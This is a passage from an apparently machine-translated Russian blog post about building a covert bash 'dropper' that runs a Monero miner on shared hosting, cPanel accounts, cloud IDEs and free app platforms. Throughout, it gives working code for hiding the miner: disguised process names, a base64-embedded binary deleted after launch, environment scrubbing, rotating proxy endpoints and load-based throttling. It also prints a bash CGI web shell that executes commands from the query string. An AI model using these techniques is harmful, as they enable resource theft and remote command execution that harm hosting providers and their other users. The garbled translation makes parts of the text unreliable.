    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>Эта функция полагается на<a href=https://ipinfo.io/> ipinfo</a> для определения региона воркера, что позволяет настроить логику, зависящую от региона,<a href=\assets/posts/geoip.json> geoip.json</a> группирует страны по регионам, так как нам нужен регион верхнего уровня, а не конкретная страна.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>Bash поддерживает TCP-соединения за счет абстракции над<code>/dev/tcp</code> (также для udp, но большинство из них обычно отключается во время сборки, поэтому на него нельзя полагаться). Эти файлы являются частью bash, они не являются частью Linux.<code>/dev</code> дерево.<p>Также стоит упомянуть систему блокировки для обработки параллелизма между заданиями bash. Чтобы несколько заданий могли работать с блокировками, все они должны иметь общий файловый дескриптор, поэтому наш<code>locker</code> который также является работой, должен быть запущен до того, как другие рабочие места захотят использовать блокировку. Шкафчик просто читает<code>stdin</code> ожидание запросов на блокировку, ответ на<code>stdout</code> в зависимости от текущего логического состояния, хранящегося в переменной. Я не гарантирую, что этот подход свободен от гонок, но, похоже, работает прилично, с другой стороны, я обнаружил, что файловые дескрипторы не очень надежны, поскольку я подозреваю, что есть некоторые буферы, которые не сбрасываются где-то в<em> трубы</em> и, в конечном итоге, попадание в тупик (что означает, что вы не можете полагаться на шкафчик, который всегда будет вам отвечать).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>Очистите свой мусор ... сложные программы на bash в конечном итоге используют множество переменных, и если вы злоупотребляете глобальным пространством, оно становится раздутым. Если вы создаете задания оболочки, они наследуют всю среду (которая фактически дублируется, а не разделяется), вы можете быстро закончить с потреблением bash.<code>100M</code> памяти, не приятно. Также мы очень хотим вести себя сдержанно. В нашем сценарии развертывания противник<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> потенциально может иметь root-доступ и полную информацию о наших процессах<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> , и вы знаете ... каждый процесс содержит информацию о полной команде, которая его запустила, и об экспортированных переменных среды.<h2 id=configuration><a class=header-anchor href=#configuration> Конфигурация</a></h2><p>Когда у нас есть среда и наши инструменты, мы должны настроить наш майнер для машины, на которой он работает, шаги настройки в псевдокоде:<ul><li><p>имя процесса для майнера<li><p>информация о хосте (оперативная память / ядра / кеши /<code>ENV_VARS</code>)<li><p>версия конфигурации<li><p><code>worker_id</code> для майнера (с ip и хоста)<li><p>ip / порт для подключения<ul><p>Выбор названия для процесса необходим для<em> Спрятать</em> тот факт, что мы запускаем майнер, но мы не просто переименовываем наш двоичный файл, у нас есть список<strong> маски</strong> для потенциальных кандидатов (простой текстовый файл, где каждая строка представляет собой маску):<ul><li><p>выбрать маску наугад<li><p>перемешайте элементы хвоста строки (все, кроме первого), чтобы получить разнообразную команду процесса. Теперь у нас есть строка вида<code>cmd --arg2 --arg1 --arg3</code> . Это наша маска майнера, запускаем бинарник<em> без</em> аргументы, но похоже, что мы запустили команду<code>cmd</code> с аргументами<code>--arg1 --arg2 --arg3</code> . В именах файлов разрешены пробелы и дефисы, поэтому можно запускать двоичный файл с таким именем, похоже, Linux не различает исполняемый файл и аргументы при сохранении команд процесса.<p>Конфигурация майнера автоматически загружается из<code>$PWD</code>.<ul><h3 id=hashrate><a class=header-anchor href=#hashrate> Хешрейт</a></h3><p>, со временем майнер получил много<strong> автоматическая настройка</strong> функции, поэтому он сделал часть моих сценариев избыточной, но разница между восходящим и нисходящим потоком здесь заключается в том, что цель восходящего потока состоит в том, чтобы максимизировать<em> представление</em> , а наша цель - максимизировать<em> эффективность и запутывание</em> , мы не хотим перегнать систему, мы хотим немного похитить без перебоев в обслуживании.<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>Для этого нам нужно более детальное понимание окружающей среды,<code>l2/l3</code> структура кеш-памяти процессора, оперативной памяти и ядер, а также текущий процессор<em> в среднем</em> нагрузка и процессор<em> использование</em>. Я попытался построить<a href=https://en.wikipedia.org/wiki/Finite-state_machine> Государственный аппарат</a> в bash, который начинался бы с самого минимума и пробовал разные конфигурации, медленно устанавливая средний лучший. Это был<strong> огромный</strong> пустая трата усилий, усеянная<a href=https://en.wikipedia.org/wiki/Technical_debt> технический долг</a> который очень быстро обанкротился и от него в основном отказались, оставив лишь остатки в кодовой базе.<p>Разбейте всю эту гигантскую автонастройку, мы просто заставили майнер спать в зависимости от использования / нагрузки хоста, для этого потребовались модификации майнера для<code>sleep</code> между потоками и несколько исправлений сторожевого таймера конфигурации<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> , что позволит нам перезагрузить количество сна во время выполнения. Логика намного упрощена и выглядит так:<ul><li><p>если использование выше / ниже $ TARGET_USAGE (± предел погрешности) увеличить / уменьшить сон<li><p>если средняя нагрузка в пределах<code>1m</code> выше / ниже $ TARGET_LOAD приостановить / возобновить майнинг<ul><h3 id=connection><a class=header-anchor href=#connection> Связь</a></h3><p>В нашем обзоре bash мы показали утилиты для подключения. Зачем они нужны? Потому что нам нужно разнообразие; просто жесткое кодирование конечной точки в конфигурации не продлится долго, когда что-то выглядит подозрительно и имеет сетевую активность, IP-адреса помечаются.<p>Вначале мы поэкспериментировали с парой методов:<ul><li><p>с использованием<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> проксичейны</a> чтобы перегрузить сетевые вызовы майнера, но для этого требовалось, чтобы майнер был построен с динамическими библиотеками, и вы должны были отправлять их с полезной нагрузкой, поэтому это было непрактично.<li><p>работает<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> передний туннель</a> бок о бок с майнером: это было связано с большими накладными расходами на настройку, поскольку теперь мы настраивали два процесса для каждого развертывания, что приводило к большему количеству ошибок.<ul><p>В конце мы остановились на том, что просто отправили список конечных точек, хранящийся в переменных bash, и выбрали одну наугад. Соединения, конечно, были зашифрованы. Что это за конечные точки? Перенаправляет на прокси-сервер, который будет обрабатывать задания майнеров.<p>Зачем нам нужен<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> прокси для майнинга</a> ? Я никогда не проходил мимо ~ 100 одновременных подключений, поэтому прокси-сервер не был действительно необходим для загрузки сети, но он был удобен для согласования алгоритма хеширования и предоставления разных целей сложности для разных майнеров, чтобы майнеры не работали над<strong> трудность</strong> задачи, выполнение которых займет у них слишком много времени, и избежать риска потери вычислений на незавершенных работах.<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> Программное обеспечение пула также потребовало нескольких модификаций, поскольку оно, к счастью, рекламировало себя как прокси для простых HTTP-запросов ...<em> это должно было быть превышено</em> , а вилка добавила контроль доступа, поэтому мы основали наши моды на этом.<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> Редактирование json</a></h3><p>Применение модификаций к json-файлу с помощью только bash, мы обошлись с некоторой заменой env var и некоторым регулярным выражением. Изначально мы полагались на<code>envsubst</code> двоичный файл для применения переменных, затем мы перешли на полную bash<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> с такой логикой:<ul><li><p>прочитать шаблон конфигурации<li><p>замените все кавычки очень эзотерической строкой (например,<code>_#_#</code>)<li><p><code>eval</code> шаблон<li><p>замените все эзотерические вхождения на кавычки<ul><p>Помимо исключения подпроцессов, еще одним преимуществом является то, что мы получаем полные возможности bash в наших шаблонах. Для чтения и записи без шаблонов мы должны полагаться на возможности регулярного выражения bash:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>Это позволяет нам редактировать только отдельные строки, для многострочных записей учитывается только первая строка .. но этого достаточно для нашего случая использования.<h2 id=runtime><a class=header-anchor href=#runtime> Время выполнения</a></h2><p>Как выглядит наша среда выполнения? У нас есть основной процесс bash, который выполняет основной цикл, затем подпроцесс майнера, подпроцесс монитора процессора, шкафчик и тюнер. Это почти горстка.<p>Сначала мы хотим убедиться, что если что-то пойдет не так, мы не оставим беспорядка, это означает, что мы используем ловушку bash для выполнения очистки при завершении.<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> снимает ловушку, чтобы предотвратить рекурсию. Ловушка убивает все рабочие места и удаляет рабочую среду.<p>Пришло время запустить майнер, который хранится как переменная bash в кодировке base64. Мы сбрасываем его в файловую систему, затем сбрасываем конфигурацию, запускаем майнер и удаляем как майнер, так и конфигурацию. В Linux вы можете удалить исполняемый файл запущенного процесса (в Windows это запрещено).<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> Когда майнер запущен, в файловой системе есть только<code>.. /</code> каталог с<code>b64</code> ссылка в нем.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>Сводящая с ума причуда, встречающаяся с bash при кодировании майнера, заключается в том, что присвоение переменной подоболочки с кавычками<code>myvar="$(something)"</code> вызывает постоянное увеличение использования памяти, это было трудно отладить, и на самом деле не удалось найти причину, по которой ведет себя так, в любом случае назначение должно быть без кавычек. Вместо этого декодирование выполняется с помощью<em> струны</em> что является абстракцией временных файлов, переменная выгружается в файл, который затем передается обратно в процесс.<p>Длительный цикл майнера:<ul><li><p>пока правда<ul><li><p>остановить майнер<li><p>удалить конфигурацию<li><p>запустить майнер<li><p>пока правда<ul><li><p>запустить демон<ul><li><p>пока майнер работает<ul><li><p>прочитать вывод майнера<li><p>выбрать действие майнера на основе выходной строки<ul></ul><li><p>если майнер не запущен: перерыв<ul><li><p>спать<ul></ul><p>Выходная строка сопоставляется с некоторым регулярным выражением:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>Демон обрабатывает случаи, когда<ul><li><p>соединение с конечной точкой дает ошибки (выберите новую случайную конечную точку)<li><p>изменяется алгоритм хеширования (настраивается время сна и специальные конфигурации)<li><p>проблемы с майнером (перезапустите майнер).<ul><p>Некоторое время существовала поддержка панели управления и контроля, которая позволяла запускать перезапуск вручную, однако, поскольку ее использование было минимальным, от нее отказались, а ее конечные точки были заменены на альтернативное соединение с пулом, а также процесс перезапуска был нестабильным и сложным. ... еще один пример технического долга. Однако он позволил повторно получить обновленную полезную нагрузку и перенастроить все конфигурации на лету, что было довольно круто, идеальный батут.<h2 id=debugging><a class=header-anchor href=#debugging> Отладка</a></h2><p>Есть три основных утилиты<ul><li><p>включить / отключить трассировку блоков кода (мы не хотим отслеживать двоичный код в кодировке b64 в переменной ..)<li><p>простая функция для форматирования логов<li><p>флаг, который будет активировать подробное ведение журнала во время выполнения при каждом запуске майнера.<ul><li><p>файл<code>.debug</code> существовать?<ul><li><p>включить подробное ведение журнала<ul></ul><ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> Целевые развертывания</a></h2><p>Эта установка была протестирована на 3 типах хостов:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> Самостоятельные контейнеры или виртуальные машины</a></h3><p>Многие хостинг-провайдеры не любят майнинг, поскольку ресурсы ЦП, как правило, делятся между несколькими пользователями, а программное обеспечение для майнинга может легко замедлить работу хост-узла, влияя на производительность остальных пользователей. Это может быть справедливо, даже если время пользователя ЦП не ограничено, потому что алгоритмы хеширования могут насыщать все уровни кэширования ЦП, если кеш совместно используется всеми ядрами ЦП.<p>Мы хотели бы использовать наши<em> справедливый</em> разделение ресурсов без блокировки, это хороший вариант использования нашего стелс-дроппера, поскольку он осведомлен об использовании хоста, а это означает, что он<em> должен</em> оставайтесь в пределах [AUP]. При работе с самостоятельным развертыванием нет никаких дополнительных шагов, только сценарий запуска, который может быть добавлен в последовательность загрузки или запущен вручную.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> веб-хостинг на основе cPanel</a></h3><p>Планы подписки на веб-хостинг в основном предлагаются через [cPanel]. Здесь мы снова используем персональные планы подписки, которые имеют разумные ограничения ресурсов, с другой стороны, любой бесплатный план имеет смехотворные ограничения.<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . cPanel позволяет вам определять обработчики для различных расширений файлов, это позволяет нам выполнять сценарии оболочки через<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> с http-запросом к сценарию оболочки, загруженному на сервер. Такого рода интерфейсы выглядят как веб-оболочки.<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . Простая веб-оболочка bash<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>Лучше полагаться только на встроенные функции, поскольку создание дополнительных процессов может быть запрещено в веб-тюрьмах, но всегда можно<code>exec</code> что позволяет нам использовать большинство утилит командной строки. Большинство веб-оболочек написаны на других языках сценариев, таких как python или php, так как вам не нужно беспокоиться о разветвлении.<p>В среде cpanel лучше использовать статическое имя для процесса майнера, например<code>httpd</code> или<code>php-fpm</code> потому что<code>cgi</code> основан на многопроцессорной обработке, поэтому серверы всегда заполнены многими процессами с такими именами, хотя внимательный наблюдатель должен заметить<em> многопоточный</em> шаблон использования, который определенно не является распространенным (или возможным) для таких языков, как perl, php, ruby ​​или python!<p>У процессов также есть ограничение по времени по умолчанию (1 час, 1 день и т. Д.), Для этого мы просто используем задание cron, которое перезапускает дроппер.<p>Это потребовало большого количества ручного редактирования, cpanel api для автоматизации этого, к сожалению, недоступно для конечных пользователей, поэтому веб-хостинг - неуклюжая и скучная цель для нашего дроппера майнера.<h3 id=web_environments><a class=header-anchor href=#web_environments> Веб-среды</a></h3><p>Есть<em> SaaS</em> провайдеры, у которых есть веб-редактор вместе с контейнером, например<a href="with a free tier before getting acquired by amazon"> Облако 9</a> , [codeanywhere], [codenvy]. Развернуть дроппер здесь легко (у вас есть полноценная среда), но поддерживать его работоспособность - обременительный процесс, поскольку любой интерактивный веб-редактор завершает свой сеанс вскоре после закрытия веб-страницы, и контейнер, следовательно, переводится в спящий режим (если вы не платить конечно).<p>Обход этого может означать только то, что мы должны держать сеансы открытыми, некоторые сценарии с [кукловодом] достигли желаемого результата, но длительная работа, утечка памяти, раздутые веб-страницы SPA определенно непривлекательны и не скрытны, потому что серверная часть поставщика сессия, открытая 24/7, обязательно будет выглядеть подозрительно. Действительно, веб-среды также являются неуклюжими и скучными целями.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> Бесплатные сервисы приложений</a></h3><p>Это в основном<a href="when it used to have a free tier"> openshift</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> и [героку]. Openshift, будучи кубернетами, было довольно просто развернуть, но в нем много оттока конфигурации, вот отрывок:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
